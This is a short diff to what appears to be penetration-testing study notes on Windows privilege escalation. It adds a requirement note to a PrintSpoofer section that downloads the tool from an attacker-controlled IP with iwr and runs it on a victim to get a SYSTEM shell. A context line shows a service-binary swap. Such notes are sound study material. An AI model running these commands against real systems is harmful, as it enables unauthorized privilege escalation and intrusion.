@@ -198,10 +198,13 @@ move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
 ```
 
-###### Named Pipe
+###### Named Pipes(PrintSpoofer)
 ```
+Requirements: SeImpersonatePrivilege has to be enabled
+
 kali: iwr -uri http://192.168.45.214/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
+
 whoami
 ```
 
